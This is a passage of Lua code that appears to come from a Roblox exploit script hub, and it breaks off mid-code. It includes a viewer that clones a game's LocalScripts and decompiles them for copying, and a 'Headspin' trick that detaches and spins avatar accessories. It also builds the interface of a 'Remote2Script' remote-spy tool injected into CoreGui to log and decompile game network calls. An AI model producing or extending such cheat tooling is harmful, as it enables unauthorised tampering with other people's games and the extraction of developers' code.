					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

-- End Scrollbar

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 16
Create(scrollBar.GUI,{
	Position = UDim2.new(1,0,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = editorGrid;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = 8
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,0);
	Size = UDim2.new(1,0,0,ScrollBarWidth);
	Parent = editorGrid;
})

local entries = {}

local grid = {}

local count = 1
local xCount = 1

local lineSpan = 0

for i = 0,490,8 do
	local newRow = {}
	for j = 0,390,16 do
		local cellText = Instance.new("TextLabel",editorGrid)
		cellText.BackgroundTransparency = 1
		cellText.BorderSizePixel = 0
		cellText.Text = ""
		cellText.Position = UDim2.new(0,i,0,j)
		cellText.Size = UDim2.new(0,8,0,16)
		cellText.Font = Enum.Font.SourceSans
		cellText.FontSize = Enum.FontSize.Size18
		table.insert(newRow,cellText)
		xCount = xCount + 1
	end
	table.insert(grid,newRow)
	count = count + 1
	xCount = 1
end

local syntaxHighlightList = {
	{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
}

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function AddZeros(num,reach)
	local toConvert = tostring(num)
	while #toConvert < reach do
		toConvert = " "..toConvert
	end
	return toConvert
end

function buildScript(source,xOff,yOff,override)
	local buildingRows = true
	local buildScr = source
	
	local totalLines = 0
	
	--print(xOff,yOff)
	
	if currentSource ~= source then
		currentSource = source
	end

	if override then
		currentSource = source
		entries = {}
		while buildingRows do
			local x,y = string.find(buildScr,"\n")
			if x and y then
				table.insert(entries,string.sub(buildScr,1,y))
				buildScr = string.sub(buildScr,y+1,string.len(buildScr))
			else
				buildingRows = false
				table.insert(entries,buildScr)
			end
		end
	end
	
	totalLines = #entries
	lineSpan = #tostring(totalLines)
	
	if lineSpan == 1 then lineSpan = 2 end
	
	local currentRow = 1
	local currentColumn = 2 + lineSpan
	
	local colorTime = 0
	local colorReplace = nil
	
	local inString = false
	
	local workingEntries = entries
	
	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]
	
	local delayance = xOff

	for i = 1,#grid do
		for j = 1,#grid[i] do
			if i <= lineSpan then
				local newNum = AddZeros(yOff + j,lineSpan)
				local newDigit =  string.sub(newNum,i,i)
				if newDigit == " " then
					grid[i][j].Text = ""
				else
					grid[i][j].Text = newDigit
				end
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
				--grid[i][j].Font = Enum.Font.SourceSansBold
			elseif i == lineSpan + 1 then
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
				--grid[i][j].Font = Enum.Font.SourceSans
			else
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 1
				--grid[i][j].Font = Enum.Font.SourceSans
			end
		end
	end
	
	while true do
		if currentRow > #workingEntries or currentRow > #grid[1] then break end
		local entry = workingEntries[currentRow+yOff]
		while string.len(entry) > 0 do
			if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end
			
			if currentColumn > #grid then break end
			
			if delayance == 0 then
				grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
			end
			
			-- Coloring
			
			if not inString then
				for i,v in pairs(syntaxHighlightList) do
					if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
						if v["Independent"] then
							local outCheck = string.len(v["Keyword"])+1
							local outEntry = string.sub(entry,outCheck,outCheck)
							if not string.find(outEntry,"%w") then
								colorTime = string.len(v["Keyword"])
								colorReplace = v["Color"]
							end
						else
							colorTime = string.len(v["Keyword"])
							colorReplace = v["Color"]
						end
					end
				end
			end
			
			if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
				inString = true
				colorTime = string.len(string.match(entry,"\".+\""))
				colorReplace = Color3.new(170/255, 0, 1)
			end
			
			if colorTime > 0 then
				colorTime = colorTime - 1
				grid[currentColumn][currentRow].TextColor3 = colorReplace
				if colorTime == 0 then inString = false end
			else
				grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
				inString = false
			end
			
			if delayance == 0 then
				currentColumn = currentColumn + 1
			else
				delayance = delayance - 1
			end
			entry = string.sub(entry,2,string.len(entry))
		end
		currentRow = currentRow + 1
		currentColumn = 2 + lineSpan
		colorTime = 0
		delayance = xOff
		inString = false
	end
end

function scrollBar.UpdateCallback(self)
	scrollBar.TotalSpace = #entries * 16
	scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function scrollBarH.UpdateCallback(self)
	scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
	scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function getLongestEntry(tab)
	local longest = 0
	for i,v in pairs(tab) do
		if string.len(v) > longest then
			longest = string.len(v)
		end
	end
	return longest
end

function openScript(scrObj)
	if scrObj:IsA("LocalScript") then
		scrObj.Archivable = true
		scrObj = scrObj:Clone()
		scrObj.Disabled = true
	end
	
	local scrName = scrObj.Name
	local scrSource = decompile(scrObj)
	
	table.insert(memoryScripts,{Name = scrName,Source = scrSource})
	
	local newTab = entryTemplate:Clone()
	newTab.Button.Text = scrName
	newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
	newTab.Visible = true
	
	newTab.Button.MouseButton1Down:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				editingIndex = i
				buildScript(memoryScripts[i].Source,0,0,true)
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
			end
		end
	end)
	
	newTab.Close.MouseButton1Click:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				table.remove(memoryScripts,i)
				if editingIndex == i then
					editingIndex = #memoryScripts
					if editingIndex > 0 then
						buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
					else
						buildScript("",0,0,true)
					end
				end
				
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
				
				for i2 = i,#scriptBar:GetChildren() do
					scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
				end
				if editingIndex > i then
					editingIndex = editingIndex - 1
				end
				newTab:Destroy()
			end
		end
	end)
	
	editingIndex = #memoryScripts
	buildScript(scrSource,0,0,true)
	
	newTab.Parent = scriptBar
end

function updateScriptBar()
	local entryCount = 0
	
	scriptBarLeft.Active = false
	scriptBarLeft.AutoButtonColor = false
	for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	scriptBarRight.Active = false
	scriptBarRight.AutoButtonColor = false
	for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	for i,v in pairs(scriptBar:GetChildren()) do
		if v.Position.X.Offset < 0 then
			scriptBarLeft.Active = true
			scriptBarLeft.AutoButtonColor = true
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0
			end
		elseif v.Position.X.Offset >= 0 then
			entryCount = entryCount + 1
			if entryCount == 5 then
				scriptBarRight.Active = true
				scriptBarRight.AutoButtonColor = true
				for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			end
		end
	end
end

scriptBar.ChildAdded:connect(updateScriptBar)
scriptBar.ChildRemoved:connect(updateScriptBar)

scriptBarLeft.MouseButton1Click:connect(function()
	if scriptBarLeft.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,100,0,0)
	end
	updateScriptBar()
end)

scriptBarRight.MouseButton1Click:connect(function()
	if scriptBarRight.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,-100,0,0)
	end
	updateScriptBar()
end)

mouse.Button1Down:connect(function()
	if checkMouseInGui(editorGrid) then
		--print("LETS EDIT!")
	end
end)

openEvent.Event:connect(function(...)
	top.Visible = true
	local args = {...}
	if #args > 0 then
		openScript(args[1])
	end
end)

clipboardButton.MouseButton1Click:connect(function()
	if Clipboard and Clipboard.set then
		Clipboard.set(currentSource)
	elseif CopyString then
		CopyString(currentSource)
	end
end)

closeButton.MouseButton1Click:connect(function()
	top.Visible = false
end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

scrollBar:Update()
scrollBarH:Update()
end)
end)

HeadspinBtn.MouseButton1Down:Connect(function()
local obese = game:GetService('Players')
for i,v in pairs(obese.LocalPlayer.Character:GetChildren()) do
if v.ClassName == "Accessory" then
local stg = v.Handle:FindFirstChildOfClass("BodyForce")
if stg == nil then
local a = Instance.new("BodyPosition")
local b = Instance.new("BodyAngularVelocity")
a.Parent = v.Handle
b.Parent = v.Handle
v.Handle.AccessoryWeld:Destroy()
b.AngularVelocity = Vector3.new(0,100,0)
b.MaxTorque = Vector3.new(0,200,0)
a.P = 30000
a.D = 50
game:GetService('RunService').Stepped:connect(function()
a.Position = obese.LocalPlayer.Character.Head.Position
end)
end
end
end
end)

RemotespyBtn.MouseButton1Down:Connect(function()


-- FrontEnd // UI

-- Objects

local RemoteSpy = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Ribbon = Instance.new("ImageLabel")
local Hide = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Remotes = Instance.new("ScrollingFrame")
local Source = Instance.new("ScrollingFrame")
local ButtonsFrame = Instance.new("Frame")
local ToClipboard = Instance.new("TextButton")
local Decompile = Instance.new("TextButton")
local GetReturn = Instance.new("TextButton")
local ClearList = Instance.new("TextButton")
local CryptStrings = Instance.new("TextButton")
local EnableSpy = Instance.new("TextButton")
local Last = Instance.new("TextLabel")
local Total = Instance.new("TextLabel")
local Settings = Instance.new("TextButton")
local SetRemotes = Instance.new("ScrollingFrame")
local Storage = Instance.new("Frame")
local RBTN = Instance.new("TextButton")
local Icon = Instance.new("ImageLabel")
local RemoteName = Instance.new("TextLabel")
local ID = Instance.new("TextLabel")
local SBTN = Instance.new("TextButton")
local Icon_2 = Instance.new("ImageLabel")
local RemoteName_2 = Instance.new("TextLabel")
local ID_2 = Instance.new("TextLabel")
local ScriptLine = Instance.new("Frame")
local Line = Instance.new("TextLabel")
local SourceText = Instance.new("TextLabel")
local Tokens = Instance.new("TextLabel")
local Strings = Instance.new("TextLabel")
local Comments = Instance.new("TextLabel")
local Keywords = Instance.new("TextLabel")
local Globals = Instance.new("TextLabel")
local RemoteHighlight = Instance.new("TextLabel")
local Enabled = Instance.new("TextLabel")
local FullScreen = Instance.new("TextButton")
local SetRemotesTab = Instance.new("Frame")
local FilterF = Instance.new("TextButton")
local FilterE = Instance.new("TextButton")
local Search = Instance.new("TextBox")
local remotes_fired = 0
local encrypt_string = false
local spy_enabled = true

local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
local global_env = {"game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}

-- Properties

RemoteSpy.Name = "RemoteSpy"
RemoteSpy.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = RemoteSpy
BG.Active = true
BG.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.141176)
BG.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
BG.Draggable = true
BG.Position = UDim2.new(0.5, -700, 0.5, -400)
BG.Size = UDim2.new(1, -300, 1, -200)
BG.ClipsDescendants = true

Ribbon.Name = "Ribbon"
Ribbon.Parent = BG
Ribbon.BackgroundColor3 = Color3.new(0.760784, 0.0117647, 0.317647)
Ribbon.BorderSizePixel = 0
Ribbon.Size = UDim2.new(1, 0, 0, 20)
Ribbon.ZIndex = 2

Hide.Name = "Hide"
Hide.Parent = Ribbon
Hide.BackgroundColor3 = Color3.new(1, 0, 0)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(1, -40, 0, 0)
Hide.Size = UDim2.new(0, 40, 0, 20)
Hide.ZIndex = 3
Hide.Font = Enum.Font.SourceSansBold
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = "_"
Hide.TextColor3 = Color3.new(1, 1, 1)
Hide.TextSize = 14

Title.Name = "Title"
Title.Parent = Ribbon
Title.BackgroundColor3 = Color3.new(1, 0.0117647, 0.423529)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.5, -100, 0, 0)
Title.Size = UDim2.new(0, 200, 0, 20)
Title.ZIndex = 3
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size14
Title.Text = "Remote2Script v2"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 14

Remotes.Name = "Remotes"
Remotes.Parent = BG
Remotes.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Remotes.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Remotes.Position = UDim2.new(0, 10, 0, 80)
Remotes.CanvasSize = UDim2.new(0, 0, 40, 0)
Remotes.Size = UDim2.new(0, 250, 1, -90)
Remotes.ZIndex = 2
Remotes.BottomImage = "rbxassetid://148970562"
Remotes.MidImage = "rbxassetid://148970562"
Remotes.ScrollBarThickness = 5
Remotes.TopImage = "rbxassetid://148970562"

Source.Name = "Source"
Source.Parent = BG
Source.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Source.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Source.Position = UDim2.new(0, 270, 0, 80)
Source.Size = UDim2.new(1, -280, 1, -90)
Source.ZIndex = 2
Source.BottomImage = "rbxassetid://148970562"
Source.CanvasSize = UDim2.new(3, 0, 160, 0)
Source.MidImage = "rbxassetid://148970562"
Source.ScrollBarThickness = 5
Source.TopImage = "rbxassetid://148970562"

ButtonsFrame.Name = "ButtonsFrame"
ButtonsFrame.Parent = BG
ButtonsFrame.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ButtonsFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
ButtonsFrame.Position = UDim2.new(0, 10, 0, 30)
ButtonsFrame.Size = UDim2.new(1, -20, 0, 40)
ButtonsFrame.ZIndex = 2
ButtonsFrame.ClipsDescendants = true

ToClipboard.Name = "ToClipboard"
ToClipboard.Parent = ButtonsFrame
ToClipboard.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ToClipboard.BorderColor3 = Color3.new(0.117647, 0.392157, 0.117647)
ToClipboard.Position = UDim2.new(0, 10, 0.5, -10)
ToClipboard.Size = UDim2.new(0, 100, 0, 20)
ToClipboard.ZIndex = 3
ToClipboard.Font = Enum.Font.SourceSansBold
ToClipboard.FontSize = Enum.FontSize.Size14
ToClipboard.Text = "COPY"
ToClipboard.TextColor3 = Color3.new(0.235294, 0.784314, 0.235294)
ToClipboard.TextSize = 14

Decompile.Name = "Decompile"
Decompile.Parent = ButtonsFrame
Decompile.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Decompile.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Decompile.Position = UDim2.new(0, 120, 0.5, -10)
Decompile.Size = UDim2.new(0, 100, 0, 20)
Decompile.ZIndex = 3
Decompile.Font = Enum.Font.SourceSansBold
Decompile.FontSize = Enum.FontSize.Size14
Decompile.Text = "DECOMPILE"
Decompile.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Decompile.TextSize = 14

GetReturn.Name = "GetReturn"
GetReturn.Parent = ButtonsFrame
GetReturn.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
GetReturn.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
GetReturn.Position = UDim2.new(0, 230, 0.5, -10)
GetReturn.Size = UDim2.new(0, 100, 0, 20)
GetReturn.ZIndex = 3
GetReturn.Font = Enum.Font.SourceSansBold
GetReturn.FontSize = Enum.FontSize.Size14
GetReturn.Text = "GET RETURN"
GetReturn.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
GetReturn.TextSize = 14

ClearList.Name = "ClearList"
ClearList.Parent = ButtonsFrame
ClearList.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
ClearList.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
ClearList.Position = UDim2.new(0, 340, 0.5, -10)
ClearList.Size = UDim2.new(0, 100, 0, 20)
ClearList.ZIndex = 3
ClearList.Font = Enum.Font.SourceSansBold
ClearList.FontSize = Enum.FontSize.Size14
ClearList.Text = "CLEAR LOGS"
ClearList.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ClearList.TextSize = 14

CryptStrings.Name = "CryptStrings"
CryptStrings.Parent = ButtonsFrame
CryptStrings.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
CryptStrings.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
CryptStrings.Position = UDim2.new(0, 450, 0.5, -10)
CryptStrings.Size = UDim2.new(0, 100, 0, 20)
CryptStrings.ZIndex = 3
CryptStrings.Font = Enum.Font.SourceSansBold
CryptStrings.FontSize = Enum.FontSize.Size14
CryptStrings.Text = "CRYPT STRINGS"
CryptStrings.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
CryptStrings.TextSize = 14

EnableSpy.Name = "EnableSpy"
EnableSpy.Parent = ButtonsFrame
EnableSpy.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
EnableSpy.BorderColor3 = Color3.fromRGB(30, 100, 30)
EnableSpy.Position = UDim2.new(0, 560, 0.5, -10)
EnableSpy.Size = UDim2.new(0, 100, 0, 20)
EnableSpy.ZIndex = 3
EnableSpy.Font = Enum.Font.SourceSansBold
EnableSpy.FontSize = Enum.FontSize.Size14
EnableSpy.Text = "REMOTESPY"
EnableSpy.TextColor3 = Color3.fromRGB(60, 200, 60)
EnableSpy.TextSize = 14

Last.Name = "Last"
Last.Parent = ButtonsFrame
Last.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Last.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Last.Position = UDim2.new(0, 670, 0.5, -10)
Last.Size = UDim2.new(0, 200, 0, 20)
Last.ZIndex = 3
Last.Font = Enum.Font.SourceSansBold
Last.FontSize = Enum.FontSize.Size14
Last.Text = ""
Last.TextColor3 = Color3.new(1, 1, 1)
Last.TextSize = 14
Last.TextWrapped = true

Total.Name = "Total"
Total.Parent = ButtonsFrame
Total.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Total.BorderColor3 = Color3.new(0.384314, 0.384314, 0.384314)
Total.Position = UDim2.new(0, 880, 0.5, -10)
Total.Size = UDim2.new(0, 50, 0, 20)
Total.ZIndex = 3
Total.Font = Enum.Font.SourceSansBold
Total.FontSize = Enum.FontSize.Size14
Total.Text = "0"
Total.TextColor3 = Color3.new(1, 1, 1)
Total.TextSize = 14
Total.TextWrapped = true

Settings.Name = "Settings"
Settings.Parent = ButtonsFrame
Settings.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Settings.BorderColor3 = Color3.new(0.117647, 0.392157, 0.392157)
Settings.Position = UDim2.new(1, -110, 0.5, -10)
Settings.Size = UDim2.new(0, 100, 0, 20)
Settings.ZIndex = 3
Settings.Font = Enum.Font.SourceSansBold
Settings.FontSize = Enum.FontSize.Size14
Settings.Text = "REMOTES"
Settings.TextColor3 = Color3.new(0.235294, 0.784314, 0.784314)
Settings.TextSize = 14

SetRemotes.Name = "SetRemotes"
SetRemotes.Parent = BG
SetRemotes.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SetRemotes.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SetRemotes.Position = UDim2.new(0, 270, 0, 80)
SetRemotes.Size = UDim2.new(1, -280, 1, -140)
SetRemotes.Visible = false
SetRemotes.ZIndex = 2
SetRemotes.BottomImage = "rbxassetid://148970562"
SetRemotes.CanvasSize = UDim2.new(0, 0, 25, 0)
SetRemotes.MidImage = "rbxassetid://148970562"
SetRemotes.ScrollBarThickness = 5
SetRemotes.TopImage = "rbxassetid://148970562"

Storage.Name = "Storage"
Storage.Parent = RemoteSpy
Storage.BackgroundColor3 = Color3.new(1, 1, 1)
Storage.Size = UDim2.new(0, 100, 0, 100)
Storage.Visible = false

RBTN.Name = "RBTN"
RBTN.Parent = Storage
RBTN.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
RBTN.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
RBTN.Position = UDim2.new(0, 10, 0, 10)
RBTN.Size = UDim2.new(1, -20, 0, 20)
RBTN.ZIndex = 3
RBTN.Font = Enum.Font.SourceSansBold
RBTN.FontSize = Enum.FontSize.Size14
RBTN.Text = ""
RBTN.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
RBTN.TextSize = 14
RBTN.TextXAlignment = Enum.TextXAlignment.Left

Icon.Name = "Icon"
Icon.Parent = RBTN
Icon.BackgroundColor3 = Color3.new(1, 1, 1)
Icon.BackgroundTransparency = 1
Icon.Size = UDim2.new(0, 20, 0, 20)
Icon.ZIndex = 4
Icon.Image = "rbxassetid://413369506"

RemoteName.Name = "RemoteName"
RemoteName.Parent = RBTN
RemoteName.BackgroundColor3 = Color3.new(0.713726, 0.00392157, 0.298039)
RemoteName.BorderSizePixel = 0
RemoteName.Position = UDim2.new(0, 30, 0, 0)
RemoteName.Size = UDim2.new(0, 140, 0, 20)
RemoteName.ZIndex = 4
RemoteName.Font = Enum.Font.SourceSansBold
RemoteName.FontSize = Enum.FontSize.Size14
RemoteName.Text = "10"
RemoteName.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
RemoteName.TextSize = 14

ID.Name = "ID"
ID.Parent = RBTN
ID.BackgroundColor3 = Color3.new(0.458824, 0.00392157, 0.192157)
ID.BorderSizePixel = 0
ID.Position = UDim2.new(1, -50, 0, 0)
ID.Size = UDim2.new(0, 50, 0, 20)
ID.ZIndex = 4
ID.Font = Enum.Font.SourceSansBold
ID.FontSize = Enum.FontSize.Size14
ID.Text = "10"
ID.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ID.TextSize = 14

SBTN.Name = "SBTN"
SBTN.Parent = Storage
SBTN.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SBTN.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SBTN.Position = UDim2.new(0, 10, 0, 10)
SBTN.Size = UDim2.new(1, -20, 0, 20)
SBTN.ZIndex = 3
SBTN.Font = Enum.Font.SourceSansBold
SBTN.FontSize = Enum.FontSize.Size14
SBTN.Text = ""
SBTN.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
SBTN.TextSize = 11
SBTN.TextXAlignment = Enum.TextXAlignment.Left

Icon_2.Name = "Icon"
Icon_2.Parent = SBTN
Icon_2.BackgroundColor3 = Color3.new(1, 1, 1)
Icon_2.BackgroundTransparency = 1
Icon_2.Size = UDim2.new(0, 20, 0, 20)
Icon_2.ZIndex = 4
Icon_2.Image = "rbxassetid://413369506"

RemoteName_2.Name = "RemoteName"
RemoteName_2.Parent = SBTN
RemoteName_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
RemoteName_2.BorderSizePixel = 1
RemoteName_2.BorderColor3 = Color3.fromRGB(62, 62, 62)
RemoteName_2.Position = UDim2.new(0, 30, 0, 0)
RemoteName_2.Size = UDim2.new(0, 140, 0, 20)
RemoteName_2.ZIndex = 4
RemoteName_2.Font = Enum.Font.SourceSansBold
RemoteName_2.FontSize = Enum.FontSize.Size14
RemoteName_2.Text = "SayMessageRequest"
RemoteName_2.TextColor3 = Color3.fromRGB(200, 200, 200)
RemoteName_2.TextSize = 11

ID_2.Name = "ID"
ID_2.Parent = SBTN
ID_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ID_2.BorderSizePixel = 1
ID_2.BorderColor3 = Color3.fromRGB(62, 62, 62)
ID_2.Position = UDim2.new(1, -700, 0, 0)
ID_2.Size = UDim2.new(0, 700, 0, 20)
ID_2.ZIndex = 3
ID_2.Font = Enum.Font.SourceSansBold
ID_2.FontSize = Enum.FontSize.Size14
ID_2.Text = "10"
ID_2.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
ID_2.TextSize = 14

ScriptLine.Name = "ScriptLine"
ScriptLine.Parent = Storage
ScriptLine.BackgroundColor3 = Color3.new(1, 1, 1)
ScriptLine.BackgroundTransparency = 1
ScriptLine.Size = UDim2.new(1, 0, 0, 17)
ScriptLine.ZIndex = 2

Line.Name = "Line"
Line.Parent = ScriptLine
Line.BackgroundColor3 = Color3.new(0.329412, 0, 0)
Line.BackgroundTransparency = 1
Line.BorderSizePixel = 0
